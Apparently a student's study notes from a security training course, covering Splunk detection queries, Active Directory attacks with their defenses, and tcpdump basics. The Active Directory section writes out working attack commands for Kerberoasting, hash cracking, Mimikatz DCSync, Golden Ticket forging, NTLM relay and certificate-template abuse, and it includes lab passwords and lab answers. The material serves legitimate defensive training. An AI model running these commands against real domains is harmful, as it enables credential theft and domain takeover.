+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=22  QueryName="*github*" | stats count by Image, QueryName</code></p>
+<ol>
+<li>Example: Detection Of PsExec Usage</li>
+</ol>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\\Windows\\system32\\services.exe" TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath" | rex field=Details "(?&lt;reg_file_name&gt;[^\\\]+)$" | eval reg_file_name = lower(reg_file_name), file_name = if(isnull(file_name),reg_file_name,lower(file_name)) | stats values(Image) AS Image, values(Details) AS RegistryDetails, values(_time) AS EventTimes, count by file_name, ComputerName</code></p>
+<p><code>| rex field=Details "(?&lt;reg_file_name&gt;[^\\\]+)$"</code>: The rex command here is extracting the file name from the Details field using a regular expression. The pattern [^\]+)$ captures the part of the path after the last backslash, which is typically the file name. This value is stored in a new field reg_file_name.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System | stats count by TargetFilename</code></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=18 Image=System | stats count by PipeName</code></p>
+<ol>
+<li>Example: Detection Of Utilizing Archive Files For Transferring Tools Or Data Exfiltration</li>
+</ol>
+<p><code>index="main" EventCode=11 (TargetFilename="*.zip" OR TargetFilename="*.rar" OR TargetFilename="*.7z") | stats count by ComputerName, User, TargetFilename | sort - count</code></p>
+<ol>
+<li>Example: Detection Of Utilizing PowerShell or MS Edge For Downloading Payloads/Tools</li>
+</ol>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*powershell.exe*" |  stats count by Image, TargetFilename |  sort + count</code></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*msedge.exe" TargetFilename=*"Zone.Identifier" |  stats count by TargetFilename |  sort + count</code></p>
+<p>The <code>*Zone.Identifier</code> is indicative of a file downloaded from the internet or another potentially untrustworthy source. Windows uses this zone identifier to track the security zones of a file. The Zone.Identifier is an ADS (Alternate Data Stream) that contains metadata about where the file was downloaded from and its security settings.</p>
+<ol>
+<li>Example: Detection Of Execution From Atypical Or Suspicious Locations</li>
+</ol>
+<p><code>index="main" EventCode=1 | regex Image="C:\\\\Users\\\\.*\\\\Downloads\\\\.*" |  stats count by Image</code></p>
+<ol>
+<li>Example: Detection Of Executables or DLLs Being Created Outside The Windows Directory</li>
+</ol>
+<p><code>index="main" EventCode=11 (TargetFilename="*.exe" OR TargetFilename="*.dll") TargetFilename!="*\\windows\\*" | stats count by User, TargetFilename | sort + count</code></p>
+<ol>
+<li>Example: Detection Of Misspelling Legitimate Binaries</li>
+</ol>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 (CommandLine="*psexe*.exe" NOT (CommandLine="*PSEXESVC.exe" OR CommandLine="*PsExec64.exe")) OR (ParentCommandLine="*psexe*.exe" NOT (ParentCommandLine="*PSEXESVC.exe" OR ParentCommandLine="*PsExec64.exe")) OR (ParentImage="*psexe*.exe" NOT (ParentImage="*PSEXESVC.exe" OR ParentImage="*PsExec64.exe")) OR (Image="*psexe*.exe" NOT (Image="*PSEXESVC.exe" OR Image="*PsExec64.exe")) |  table Image, CommandLine, ParentImage, ParentCommandLine</code></p>
+<ol>
+<li>Example: Detection Of Using Non-standard Ports For Communications/Transfers</li>
+</ol>
+<p><code>index="main" EventCode=3 NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21) | stats count by SourceIp, DestinationIp, DestinationPort | sort - count</code></p>
+<h2 id="detecting-attacker-behavior-with-splunk-based-on-analytics">Detecting Attacker Behavior With Splunk Based On Analytics</h2>
+<p>The <code>streamstats</code> command allows us to perform real-time analytics on the data, which can be useful for identifying unusual patterns or trends.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | bin _time span=1h | stats count as NetworkConnections by _time, Image | streamstats time_window=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image | eval isOutlier=if(NetworkConnections &gt; (avg + (0.5*stdev)), 1, 0) | search isOutlier=1</code></p>
+<ol>
+<li>Example: Detection Of Abnormally Long Commands</li>
+</ol>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe | eval len=len(CommandLine) | table User, len, CommandLine | sort - len</code></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe ParentImage!="*msiexec.exe" ParentImage!="*explorer.exe" | eval len=len(CommandLine) | table User, len, CommandLine | sort - len</code></p>
+<ol>
+<li>Example: Detection Of Abnormal cmd.exe Activity</li>
+</ol>
+<p><code>index="main" EventCode=1 (CommandLine="*cmd.exe*") | bucket _time span=1h | stats count as cmdCount by _time User CommandLine | eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev | eval isOutlier=if(cmdCount &gt; avg+1.5*stdev, 1, 0) | search isOutlier=1</code></p>
+<ol>
+<li>Example: Detection Of Processes Loading A High Number Of DLLs In A Specific Time</li>
+</ol>
+<p><code>index="main" EventCode=7 | bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded &gt; 3 | stats count by Image, unique_dlls_loaded</code></p>
+<p><code>index="main" EventCode=7 NOT (Image="C:\\Windows\\System32*") NOT (Image="C:\\Program Files (x86)*") NOT (Image="C:\\Program Files*") NOT (Image="C:\\ProgramData*") NOT (Image="C:\\Users\\waldo\\AppData*")| bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded &gt; 3 | stats count by Image, unique_dlls_loaded | sort - unique_dlls_loaded</code></p>
+<ol>
+<li>Example: Detection Of Transactions Where The Same Process Has Been Created More Than Once On The Same Computer</li>
+</ol>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | transaction ComputerName, Image | where mvcount(ProcessGuid) &gt; 1 | stats count by Image, ParentImage</code></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1  | transaction ComputerName, Image  | where mvcount(ProcessGuid) &gt; 1 | search Image="C:\\Windows\\System32\\rundll32.exe" ParentImage="C:\\Windows\\System32\\svchost.exe" | table CommandLine, ParentCommandLine</code></p>
+<p><strong>Q1:</strong></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=8 
+| bin _time span=1h 
+| stats count as thread_injections by _time, SourceImage 
+| eventstats avg(thread_injections) as avg_injections, stdev(thread_injections) as stdev_injections 
+| eval upper_limit = avg_injections + (2 * stdev_injections) 
+| where thread_injections &gt; upper_limit 
+| table _time, SourceImage, thread_injections, avg_injections, stdev_injections, upper_limit 
+| sort -thread_injections</code></p>
+<p>Sysmon Event ID 8 - CreateRemoteThread: Potentially aids in identifying injected threads.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=8 | bin _time span=1h 
+|  stats count as thread_injections by _time, SourceImage</code></p>
+<p><img alt="alt text" src="../assets/image9.png" /></p>
+<h4 id="skills-assessment">Skills Assessment</h4>
+<p><strong>Q1:</strong> Navigate to http://[Target IP]:8000, open the "Search &amp; Reporting" application, and find through SPL searches against all data the process that created remote threads in rundll32.exe. Answer format: _.exe</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=8 TargetImage="*rundll32.exe*" | stats count by SourceImage</code></p>
+<p>randomfile.exe</p>
+<p><strong>Q2:</strong> Navigate to http://[Target IP]:8000, open the "Search &amp; Reporting" application, and find through SPL searches against all data the process that started the infection. Answer format: _.exe</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 | search "*randomfile.exe*" | stats count by TargetFilename Image</code></p>
+<p>Found <code>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</code> download <code>randomfile.exe</code> and file creation time is <code>11/06/2022 10:08:46 AM</code></p>
+<p>rundll32.exe</p>
+<h1 id="windows-attacks-defense">Windows Attacks &amp; Defense</h1>
+<p><strong>Lab Environment</strong></p>
+<p>The attacks will be executed from the provided Windows 10 (WS001) and Kali Linux machines. The assumption is that an attacker has already gained remote code execution (of some sort) on that Windows 10 (WS001) machine. The user, which we assume is compromised, is Bob, a regular user in Active Directory with no special permissions assigned.</p>
+<p>The environment consists of the following machines and their corresponding IP addresses:</p>
+<p>DC1: 172.16.18.3</p>
+<p>DC2: 172.16.18.4</p>
+<p>Server01: 172.16.18.10</p>
+<p>PKI: 172.16.18.15</p>
+<p>WS001: DHCP or 172.16.18.25 (depending on the section)</p>
+<p>Kali Linux: DHCP or 172.16.18.20 (depending on the section)</p>
+<p><strong>Connect to WS001 via RDP</strong></p>
+<p><code>xfreerdp /u:eagle\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution</code></p>
+<p><strong>Connect to Kali via SSH</strong></p>
+<p><code>$ ssh kali@TARGET_IP</code> </p>
+<p>Password is kali</p>
+<p>We have also enabled RDP on the Kali host. For sections with the Kali host as the primary target, it is recommended to connect with RDP. </p>
+<p><code>xfreerdp /v:TARGET_IP /u:kali /p:kali /dynamic-resolution</code></p>
+<p><strong>Moving files between WS001 and your Linux attacking machine</strong></p>
+<p>To facilitate easy file transfer between the machines, we have created a shared folder on WS001, which can be accessed via SMB.</p>
+<p><code>$ smbclient \\\\TARGET_IP\\Share -U eagle/administrator%Slavi123</code></p>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<pre><code class="language-bash">.\Rubeus.exe kerberoast /outfile:spn.txt
+</code></pre>
+<p><strong>Q2:</strong></p>
+<p>Remote Desktop Connection -&gt; Event viewer -&gt; Windows Logs -&gt; Security -&gt; Filter Current Log (Last Hour) -&gt; Event ID 4769 (A Kerberos service ticket was requested) -&gt; Find "webservice"</p>
+<p><img alt="alt text" src="../assets/image10.png" /></p>
+<h2 id="as-reproasting">AS-REProasting</h2>
+<p>The success of this attack depends on the strength of the password of users with Do not require Kerberos preauthentication configured.</p>
+<p><code>.\Rubeus.exe asreproast /outfile:asrep.txt</code></p>
+<p>For hashcat to be able to recognize the hash, we need to edit it by adding <code>23$</code> after <code>$krb5asrep$</code></p>
+<p><code>$krb5asrep$23$anni@eagle.local:</code></p>
+<p><code>sudo hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --outfile asrepcrack.txt --force</code></p>
+<p><strong>Event ID 4768(S, F):</strong> A Kerberos authentication ticket (TGT) was requested.</p>
+<h2 id="gpp-passwords-group-policy-preferences">GPP Passwords (Group Policy Preferences)</h2>
+<p>SYSVOL is a network share on all Domain Controllers, containing logon scripts, group policy data, and other required domain-wide data. AD stores all group policies in <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>.</p>
+<pre><code class="language-bash">powershell -ep bypass
+Import-Module .\Get-GPPPassword.ps1
+Get-GPPPassword
+</code></pre>
+<p><strong>Prevention:</strong> For auditing, we can generate an event whenever a user reads the XML file containing the credentials.</p>
+<p><strong>Event ID 4663:</strong>  An attempt was made to access an object.</p>
+<h2 id="gpo-permissionsgpo-files">GPO Permissions/GPO Files</h2>
+<p><strong>Prevention</strong></p>
+<p>One way to prevent this attack is to lock down the GPO permissions to be modified by a particular group of users only or by a specific account, as this will significantly limit the ability of who can edit the GPO or change its permissions (as opposed to everybody in Domain admins, which in some organizations can easily be more than 50). Similarly, never deploy files stored in network locations so that many users can modify the share permissions.</p>
+<p>We should also review the permissions of GPOs actively and regularly, with the option of automating a task that runs hourly and alerts if any deviations from the expected permissions are detected.</p>
+<p><strong>Event ID 5136(S)</strong> A directory service object was modified.</p>
+<ul>
+<li>
+<p>GPO is linked to non-critical servers only.</p>
+</li>
+<li>
+<p>Continuous automation is in place for monitoring modifications of GPO. - - If the GPO file is modified, we will disable the user performing the modification immediately.</p>
+</li>
+<li>
+<p>The GPO should be automatically unlinked from all locations if a modification is detected.</p>
+</li>
+</ul>
+<pre><code class="language-powershell"># Define filter for the last 15 minutes
+$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)
+
+# Search for event ID 5136 (GPO modified) in the past 15 minutes
+$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
+Where-Object {$_.Properties[8].Value -match &quot;CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL&quot;}
+
+
+if($Logs){
+    $emailBody = &quot;Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n&quot;
+    $disabledUsers = @()
+    ForEach($log in $logs){
+        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
+            Disable-ADAccount -Identity $log.Properties[3].Value
+            $emailBody = $emailBody + &quot;Disabled user &quot; + $log.Properties[3].Value + &quot;`r`n&quot;
+            $disabledUsers += $log.Properties[3].Value
+        }
+    }
+    # Send an alert via email - complete the command below
+    # Send-MailMessage
+    $emailBody
+}
+</code></pre>
+<p><strong>Event ID 4725</strong> is a security event that is logged in Active Directory when a user or computer object is disabled.</p>
+<h2 id="credentials-in-shares">Credentials in Shares</h2>
+<pre><code class="language-powershell">powershell -ep bypass
+Import-Module .\PowerView.ps1
+Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
+</code></pre>
+<p><img alt="alt text" src="../assets/image11.png" /></p>
+<p><code>\\Server01.eagle.local\dev$</code></p>
+<p><strong><code>findstr</code> command:</strong></p>
+<p><code>/s</code> forces to search the current directory and all subdirectories</p>
+<p><code>/i</code> ignores case in the search term</p>
+<p><code>/m</code> shows <em>only</em> the filename for a file that matches the term. We highly need this in real production environments because of the huge amounts of text that get returned. For example, this can be thousands of lines in PowerShell scripts that contain the PassThru parameter when matching for the string pass.</p>
+<p>The term that defines what we are looking for. Good candidates include pass, pw, and the NETBIOS name of the domain. In the playground environment, it is eagle. Attractive targets for this search would be file types such as .bat, .cmd, .ps1, .conf, .config, and .ini.</p>
+<pre><code class="language-bash">cd \\Server01.eagle.local\dev$
+
+# find password in files
+findstr /m /s /i &quot;pass&quot; *.bat
+findstr /m /s /i &quot;pass&quot; *.cmd
+findstr /m /s /i &quot;pass&quot; *.ini
+findstr /m /s /i &quot;pass&quot; *.config
+
+findstr /m /s /i &quot;pw&quot; *.config
+findstr /s /i &quot;pw&quot; *.config
+
+findstr /m /s /i &quot;eagle&quot; *.ps1
+findstr /s /i &quot;eagle&quot; *.ps1
+</code></pre>
+<p>Event IDs 4624/4625 (successful and failed logon) and 4768 (Kerberos TGT requested)</p>
+<p><strong>Q1:</strong></p>
+<p><code>findstr /s /i "Administrator2" *.ps1</code></p>
+<h2 id="credentials-in-object-properties">Credentials in Object Properties</h2>
+<pre><code class="language-powershell">Function SearchUserClearTextInformation
+{
+    Param (
+        [Parameter(Mandatory=$true)]
+        [Array] $Terms,
+
+        [Parameter(Mandatory=$false)]
+        [String] $Domain
+    )
+
+    if ([string]::IsNullOrEmpty($Domain)) {
+        $dc = (Get-ADDomain).RIDMaster
+    } else {
+        $dc = (Get-ADDomain $Domain).RIDMaster
+    }
+
+    $list = @()
+
+    foreach ($t in $Terms)
+    {
+        $list += &quot;(`$_.Description -like `&quot;*$t*`&quot;)&quot;
+        $list += &quot;(`$_.Info -like `&quot;*$t*`&quot;)&quot;
+    }
+
+    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
+        Where { Invoke-Expression ($list -join ' -OR ') } | 
+        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
+        fl
+}
+</code></pre>
+<pre><code class="language-bash">Import-Module .\SearchUserClearTextInformation.ps1
+SearchUserClearTextInformation -Terms &quot;pass&quot;
+</code></pre>
+<p><img alt="alt text" src="../assets/image12.png" /></p>
+<p>DC1 (172.16.18.3)</p>
+<p>Event ID 4771(F) Kerberos pre-authentication failed.</p>
+<p>Event ID 4776(S, F): The computer attempted to validate the credentials for an account.</p>
+<h2 id="dcsync">DCSync</h2>
+<p>DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:</p>
+<ul>
+<li>
+<p>Replicating Directory Changes</p>
+</li>
+<li>
+<p>Replicating Directory Changes All</p>
+</li>
+</ul>
+<pre><code>runas /user:eagle\rocky cmd.exe
+
+C:\Mimikatz&gt;mimikatz.exe
+
+mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
+</code></pre>
+<p><strong>Prevention</strong></p>
+<p>The only prevention technique against this attack is using solutions such as the <strong>RPC Firewall</strong>, a third-party product that can block or allow specific RPC calls with robust granularity. For example, using RPC Firewall, we can only allow replications from Domain Controllers.</p>
+<p><strong>Event ID 4662(S, F)</strong> An operation was performed on an object.</p>
+<h2 id="golden-ticket">Golden Ticket</h2>
+<p>The Kerberos Golden Ticket is an attack in which threat agents can create/generate tickets for any user in the Domain, therefore effectively acting as a Domain Controller.</p>
+<p>To perform the Golden Ticket attack, we can use Mimikatz with the following arguments:</p>
+<p><code>/domain</code>: The domain's name.</p>
+<p><code>/sid</code>: The domain's SID value.</p>
+<p><code>/rc4</code>: The password's hash of krbtgt.</p>
+<p><code>/user</code>: The username for which Mimikatz will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)</p>
+<p><code>/id</code>: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.</p>
+<p>Additionally, advanced threat agents mostly will specify values for the /renewmax and /endin arguments, as otherwise, Mimikatz will generate the ticket(s) with a lifetime of 10 years, making it very easy to detect by EDRs:</p>
+<p><code>/renewmax</code>: The maximum number of days the ticket can be renewed.</p>
+<p><code>/endin</code>: End-of-life for the ticket.</p>
+<p>First, we need to obtain the password's hash of krbtgt and the SID value of the Domain. We can utilize DCSync with Rocky's account from the previous attack to obtain the hash:</p>
+<pre><code class="language-bash">runas /user:eagle\rocky cmd.exe
+mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
+
+Hash NTLM: db0d0630064747072a7da3f7c3b4069e
+</code></pre>
+<pre><code class="language-bash"># bob user
+powershell -exec bypass
+. .\PowerView.ps1
+Get-DomainSID
+
+S-1-5-21-1518138621-4282902758-752445584
+</code></pre>
+<pre><code class="language-bash"># rocky
+# mimikatz
+kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
+
+exit
+
+klist
+
+dir \\dc1\c$
+</code></pre>
+<p><img alt="alt text" src="../assets/image13.png" /></p>
+<p><img alt="alt text" src="../assets/image14.png" /></p>
+<p><strong>Event ID 4675(S)</strong> SIDs were filtered. - Windows 10</p>
+<h2 id="kerberos-constrained-delegation">Kerberos Constrained Delegation</h2>
+<p>Kerberos Delegation enables an application to access resources hosted on a different server.</p>
+<pre><code class="language-bash">powershell -ep bypass
+
+Import-Module .\PowerView-main.ps1
+
+Get-NetUser -TrustedToAuth
+
+.\Rubeus.exe hash /password:Slavi123
+
+# S4U (Service For User)
+.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:&quot;http/dc1&quot; /dc:dc1.eagle.local /ptt
+
+klist 
+# With the ticket being available, we can connect to the Domain Controller impersonating the account Administrator:
+Enter-PSSession dc1
+
+hostname
+</code></pre>
+<h2 id="print-spooler-ntlm-relaying">Print Spooler &amp; NTLM Relaying</h2>
+<p>The <strong>Print Spooler</strong> is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, <em>Lee Christensen</em> found the <strong>PrinterBug</strong>. The functions <code>RpcRemoteFindFirstPrinterChangeNotification</code> and <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the reverse connection will carry authentication information as a TGT. Therefore, any domain user can coerce <code>RemoteServer$</code> to authenticate to any machine. Microsoft's stance on the <strong>PrinterBug</strong> was that it will not be fixed, as the issue is "by-design".</p>
+<pre><code class="language-bash"># configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack
+# connect to the Kali machine
+$ xfreerdp /u:kali /p:kali /v:10.129.246.71 /dynamic-resolution
+
+$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
+$ python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
+
+$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:172.16.18.3 /dynamic-resolution
+</code></pre>
+<p><a href="https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py">dementor.py</a></p>
+<p><strong>Prevention</strong></p>
+<p>Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.</p>
+<p>Additionally, there is an option to prevent the abuse of the PrinterBug while keeping the service running: when disabling the registry key <code>RegisterSpoolerRemoteRpcEndPoint</code>, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it:</p>
+<p><img alt="alt text" src="../assets/image15.png" /></p>
+<p><strong>Q2:</strong></p>
+<p><img alt="alt text" src="../assets/image16.png" /></p>
+<h2 id="coercing-attacks-unconstrained-delegation">Coercing Attacks &amp; Unconstrained Delegation</h2>
+<pre><code class="language-bash"># powerview
+Get-NetComputer -Unconstrained | select samaccountname
+
+#start Rubeus in an administrative prompt to monitor for new logons and extract TGTs
+.\Rubeus.exe monitor /interval:1
+
+# switch to the Kali machine to execute Coercer towards DC1, while we force it to connect to WS001 if coercing is successful
+$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
+
+.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
+
+.\mimikatz.exe &quot;lsadump::dcsync /domain:eagle.local /user:Administrator&quot;
+</code></pre>
+<h2 id="object-acls">Object ACLs</h2>
+<pre><code class="language-bash">.\SharpHound.exe -c All
+</code></pre>
+<p><strong>Event ID 4738(S)</strong> A user account was changed. - Windows 10</p>
+<p><strong>Event ID 4724</strong> indicates an attempt to reset another account's password</p>
+<p><strong>Event ID 4742(S)</strong> A computer account was changed. - Windows 10</p>
+<h2 id="pki-esc1">PKI - ESC1</h2>
+<pre><code class="language-bash">.\Certify.exe find /vulnerable
+
+# the certificate expires after several minutes
+.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
+
+# avoid bad formatting of the PEM file
+$ sed -i 's/\s\s\+/\n/g' cert.pem
+
+$ openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
+
+.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
+</code></pre>
+<h1 id="intro-to-network-traffic-analysis">Intro to Network Traffic Analysis</h1>
+<p><strong>OSI / TCP-IP Models</strong></p>
+<p>Protocol Data Units (PDU)</p>
+<p><img alt="alt text" src="../assets/image17.png" /></p>
+<p><strong>PDU Packet Breakdown</strong></p>
+<p><img alt="alt text" src="../assets/image18.png" /></p>
+<h2 id="tcpdump-fundamentals">Tcpdump Fundamentals</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Switch Command</th>
+<th style="text-align: left;">Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">D</td>
+<td style="text-align: left;">Will display any interfaces available to capture from.</td>
+</tr>
+<tr>
+<td style="text-align: center;">i</td>
+<td style="text-align: left;">Selects an interface to capture from. ex. -i eth0</td>
+</tr>
+<tr>
+<td style="text-align: center;">n</td>
+<td style="text-align: left;">Do not resolve hostnames.</td>
+</tr>
+<tr>
+<td style="text-align: center;">nn</td>
+<td style="text-align: left;">Do not resolve hostnames or well-known ports.</td>
+</tr>
+<tr>
+<td style="text-align: center;">e</td>
+<td style="text-align: left;">Will grab the ethernet header along with upper-layer data.</td>
+</tr>
+<tr>
+<td style="text-align: center;">X</td>
+<td style="text-align: left;">Show Contents of packets in hex and ASCII.</td>
+</tr>
+<tr>
+<td style="text-align: center;">XX</td>
+<td style="text-align: left;">Same as X, but will also specify ethernet headers. (like using Xe)</td>
+</tr>
+<tr>
+<td style="text-align: center;">v, vv, vvv</td>
+<td style="text-align: left;">Increase the verbosity of output shown and saved.</td>
+</tr>
+<tr>
+<td style="text-align: center;">c</td>
+<td style="text-align: left;">Grab a specific number of packets, then quit the program.</td>
+</tr>
+<tr>
+<td style="text-align: center;">s</td>
+<td style="text-align: left;">Defines how much of a packet to grab.</td>
+</tr>
+<tr>
+<td style="text-align: center;">S</td>
+<td style="text-align: left;">change relative sequence numbers in the capture display to absolute sequence numbers. (13248765839 instead of 101)</td>
+</tr>
+<tr>
+<td style="text-align: center;">q</td>
+<td style="text-align: left;">Print less protocol information.</td>
+</tr>
+<tr>
+<td style="text-align: center;">r file.pcap</td>
+<td style="text-align: left;">Read from a file.</td>
+</tr>
+<tr>
+<td style="text-align: center;">w file.pcap</td>
+<td style="text-align: left;">Write into a file.</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># Listing Available Interfaces
+$ sudo tcpdump -D
+
+# Choosing an Interface to Capture From
+$ sudo tcpdump -i eth0
+
+# Disable Name Resolution
+$ sudo tcpdump -i eth0 -nn
+
+# Display the Ethernet Header
+$ sudo tcpdump -i eth0 -e
+
+# Include ASCII and Hex Output
+$ sudo tcpdump -i eth0 -X
+
+# Tcpdump Switch Combinations
+$ sudo tcpdump -i eth0 -nnvXX
+
+# Save our PCAP Output to a File
+$ sudo tcpdump -i eth0 -w ~/output.pcap
+
+# Reading Output From a File
+$ sudo tcpdump -r ~/output.pcap
+</code></pre>
+<h2 id="tcpdump-packet-filtering">Tcpdump Packet Filtering</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Filter</th>
+<th style="text-align: left;">Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">host</td>
+<td style="text-align: left;">host will filter visible traffic to show anything involving the designated host. Bi-directional</td>
+</tr>
+<tr>
+<td style="text-align: center;">src / dest</td>
+<td style="text-align: left;">src and dest are modifiers. We can use them to designate a source or destination host or port.</td>
+</tr>
+<tr>
+<td style="text-align: center;">net</td>
+<td style="text-align: left;">net will show us any traffic sourcing from or destined to the network designated. It uses / notation.</td>
+</tr>
+<tr>
+<td style="text-align: center;">proto</td>
+<td style="text-align: left;">will filter for a specific protocol type. (ether, TCP, UDP, and ICMP as examples)</td>
+</tr>
+<tr>
+<td style="text-align: center;">port</td>
+<td style="text-align: left;">port is bi-directional. It will show any traffic with the specified port as the source or destination.</td>
+</tr>
+<tr>
+<td style="text-align: center;">portrange</td>
+<td style="text-align: left;">portrange allows us to specify a range of ports. (0-1024)</td>
+</tr>
+<tr>
+<td style="text-align: center;">less / greater "&lt; &gt;"</td>
+<td style="text-align: left;">less and greater can be used to look for a packet or protocol option of a specific size.</td>
+</tr>
+<tr>
+<td style="text-align: center;">and / &amp;&amp;</td>
+<td style="text-align: left;">and &amp;&amp; can be used to concatenate two different filters together. for example, src host AND port.</td>
+</tr>
+<tr>
+<td style="text-align: center;">or</td>
+<td style="text-align: left;">or allows for a match on either of two conditions. It does not have to meet both. It can be tricky.</td>
+</tr>
+<tr>
+<td style="text-align: center;">not</td>
+<td style="text-align: left;">not is a modifier saying anything but x. For example, not UDP.</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># Host Filter
+$ sudo tcpdump -i eth0 host 172.16.146.2
+
+# Source/Destination Filter
+$ sudo tcpdump -i eth0 src host 172.16.146.2
+
+# Utilizing Source With Port as a Filter
+$ sudo tcpdump -i eth0 tcp src port 80
+
+# Using Destination in Combination with the Net Filter
+$ sudo tcpdump -i eth0 dest net 172.16.146.0/24
+
+# Protocol Filter - Common Name
+$ sudo tcpdump -i eth0 udp
+
+# Protocol Filter - Number
+# Protocol 17 is the User Datagram Protocol (UDP). 
+$ sudo tcpdump -i eth0 proto 17
+
+# Port Filter
+$ sudo tcpdump -i eth0 tcp port 443
+
+# Port Range Filter
+$ sudo tcpdump -i eth0 portrange 0-1024
+
+# Less/Greater Filter
+$ sudo tcpdump -i eth0 less 64
+
+# Utilizing Greater
+$ sudo tcpdump -i eth0 greater 500
+
+# AND Filter
+$ sudo tcpdump -i eth0 host 192.168.0.1 and port 23
+
+# OR Filter
+$ sudo tcpdump -r sus.pcap icmp or host 172.16.146.1
+
+# NOT Filter
+$ sudo tcpdump -r sus.pcap not icmp
+</code></pre>
+<p><strong>Tips and Tricks</strong></p>
+<pre><code class="language-bash"># -A will show only the ASCII text
+$ sudo tcpdump -Ar telnet.pcap
+
+# Piping a Capture to Grep
+# used the -l to pass the output to grep
+$ sudo tcpdump -Ar http.cap -l | grep 'mailto:*'
+
+# Looking for TCP Protocol Flags
+$ tcpdump -i eth0 'tcp[13] &amp;2 != 0'
+
+# Hunting For a SYN Flag
+$ sudo tcpdump -i eth0 'tcp[13] &amp;2 != 0'
+</code></pre>
+<h2 id="wireshark">Wireshark</h2>
+<pre><code class="language-bash"># filter commands
+ftp
+ftp.request.command
+
+# ftp-data - Will show any data transferred over the data channel ( port 20 )
+ftp-data
+</code></pre>
+<h1 id="intermediate-network-traffic-analysis">Intermediate Network Traffic Analysis</h1>
